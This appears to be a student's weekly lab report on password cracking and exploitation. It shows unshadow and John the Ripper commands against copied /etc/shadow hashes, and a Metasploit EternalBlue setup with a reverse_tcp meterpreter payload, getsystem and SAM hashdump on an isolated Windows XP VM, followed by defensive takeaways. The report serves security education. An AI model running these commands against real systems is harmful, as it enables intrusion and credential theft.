# **Week 4 Task Report: Password Cracking & Windows Exploitation**

## **⚠️ Disclaimer: For Educational Purposes Only**

**This report documents a security research exercise performed in a controlled, isolated lab environment. All activities were conducted on my own virtual machines, which were created specifically for this purpose.**
*   **No real systems, networks, or user accounts were targeted.**
*   **All exploits were performed against intentionally vulnerable, outdated operating systems (Windows XP) that have no connection to any production or public network.**
*   **The password hashes used were generated within this lab environment.**

**The purpose of this project is strictly educational. It aims to:**
*   Understand the theory and practical execution of various password cracking techniques.
*   Demonstrate the critical security risks of using weak passwords and outdated, unpatched software.
*   Highlight the importance of strong password policies, system patching, and modern defensive controls.

**Unauthorized access to computer systems is illegal and unethical. This knowledge is to be used for defensive security purposes, such as penetration testing with explicit permission, threat modeling, and improving organizational security posture.**

---

## **Overview**

This week's tasks focused on offensive security techniques related to authentication and exploitation. The work was divided into two main parts:
1.  **Password Cracking Fundamentals:** Extracting and cracking password hashes from both Linux and Windows systems using various methods (Dictionary, Brute Force, Hybrid, Rainbow Tables) with tools like `John the Ripper`.
2.  **System Exploitation:** Gaining initial access to a vulnerable Windows XP system using the Metasploit Framework, followed by post-exploitation activities to dump and crack password hashes.

The objective was to understand the attacker's workflow to build more effective defenses.

## **Lab Environment**

*   **Attacker Machine:** Kali Linux 2023 (Virtual Machine)
*   **Target 1 (Linux):** Ubuntu 20.04 (Virtual Machine) with a weak user password set.
*   **Target 2 (Windows):** Windows XP SP2 (Virtual Machine - **Intentionally vulnerable and isolated**).
*   **Network:** All VMs connected to a virtual host-only network with no internet access.

## **Tools Used**

*   **Password Cracking:** `John the Ripper`, `unshadow`
*   **Exploitation Framework:** `Metasploit` (msfconsole)
*   **Hash Extraction:** `meterpreter` privileges, `hashdump`

---

## **Part 1: Linux Password Cracking with John the Ripper**

### **Objective**
To extract a password hash from a Linux system and successfully crack it using multiple attack vectors.

### **Methodology & Steps**

#### **1. Understanding Linux Password Storage**
*   Linux passwords are stored in a one-way encrypted (hashed) format in the `/etc/shadow` file.
*   The `/etc/passwd` file contains user account information.
*   To crack a password, these two files must be combined into a single file for John to process.

#### **2. Hash Extraction**
1.  On the Linux target VM, a new user was created with a weak password: `password123`.
2.  From the Kali attacker machine, basic privilege escalation was simulated by assuming read access to the sensitive files.
3.  The `/etc/passwd` and `/etc/shadow` files were copied to the Kali machine.
4.  The `unshadow` tool (included with John the Ripper) was used to combine them:
    ```bash
    unshadow passwd_copy shadow_copy > crack_me.txt
    ```

#### **3. Cracking with John the Ripper**
The combined `crack_me.txt` file was then attacked using different methods:

*   **Dictionary Attack:**
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt crack_me.txt
    ```
    *   **Result:** The password `password123` was cracked instantly as it existed in the rockyou.txt wordlist.

*   **Brute Force Attack (Theoretical):**
    ```bash
    john --format=crypt crack_me.txt
    ```
    *   **Observation:** A full brute-force attack was started to demonstrate the process. It was stopped after a short time due to the time-intensive nature of this method. This highlights why complex passwords are effective.

### **Findings & Results**
*   **Weak passwords are highly vulnerable.** A dictionary attack using a common wordlist cracked the password in seconds.
*   The `unshadow` tool is essential for preparing Linux hashes for cracking.
*   **Defensive Takeaway:** Enforcing strong, unique passwords that are not found in common wordlists is the first line of defense.

---

## **Part 2: Windows XP Exploitation & Password Cracking**

### **Objective**
To exploit a known vulnerability in Windows XP, gain remote access, extract password hashes from the SAM database, and crack them.

### **Methodology & Steps**

#### **1. Vulnerability Identification**
*   Windows XP is end-of-life and contains numerous unpatched vulnerabilities.
*   The `ms17-010` EternalBlue exploit was selected for its reliability against unpatched systems.

#### **2. Gaining Access with Metasploit**
1.  **Start Metasploit:** Launched `msfconsole` on Kali.
2.  **Configure the Exploit:**
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <Windows_XP_IP>
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST <Kali_IP>
    ```
3.  **Launch the Exploit:**
    ```bash
    exploit
    ```
4.  **Result:** The exploit was successful, and a `meterpreter` session was opened, providing full command-line access to the Windows XP system.

#### **3. Post-Exploitation & Hash Dumping**
1.  From the active `meterpreter` session, privileges were escalated to `SYSTEM` using the `getsystem` command.
2.  The hashes were dumped from the Security Account Manager (SAM) database using the `hashdump` command.
3.  The hashes (in LM:NTLM format) were saved to a file on the Kali machine.

#### **4. Cracking the Windows Hashes**
The NTLM hashes were cracked using John the Ripper.
*   **Dictionary Attack:**
    ```bash
    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt win_hashes.txt
    ```
    *   **Result:** The weak Administrator password was successfully cracked, revealing the plaintext password.

### **Findings & Results**
*   **Outdated systems are extremely vulnerable.** A known, patchable vulnerability from 2017 provided complete system control.
*   The `meterpreter` shell is a powerful post-exploitation tool that allows for easy extraction of sensitive system data like password hashes.
*   **Defensive Takeaway:**
    1.  **Patch Management:** This entire attack is prevented by applying security updates. Keeping systems patched is the single most important security practice.
    2.  **Strong Passwords:** Even after exploitation, strong passwords (long, complex, unique) can prevent an attacker from easily cracking hashes and moving laterally.
    3.  **Network Segmentation:** Isolating critical or older systems can prevent an attacker from easily reaching them.

---

## **Conclusion & Key Takeaways**

This week provided a practical deep dive into the core attack vectors of password cracking and initial exploitation.

1.  **The Weakest Link:** Passwords remain a critical attack surface. **Strong, unique passwords are non-negotiable.** Using a password manager and enabling Multi-Factor Authentication (MFA) wherever possible drastically reduces risk.
2.  **Patching is Paramount:** The Windows XP exploitation demonstrated that unpatched software is one of the biggest risks to an organization's security. A robust and timely patch management policy is essential.
3.  **Assume Breach Mindset:** The ease of dumping hashes after gaining initial access shows that defenders must operate under the assumption that an attacker may already be inside the network. Strategies like **network segmentation,** **privileged access management (PAM),** and **continuous monitoring** are crucial to limit an attacker's movement.
4.  **Understanding Offense to Improve Defense:** By learning how these attacks work, we can better design systems to detect and prevent them, such as monitoring for SMB exploits with an IDS/IPS or configuring Windows to use only strong NTLMv2 authentication.

This hands-on experience is invaluable for building a career in cybersecurity operations, penetration testing, or incident response.
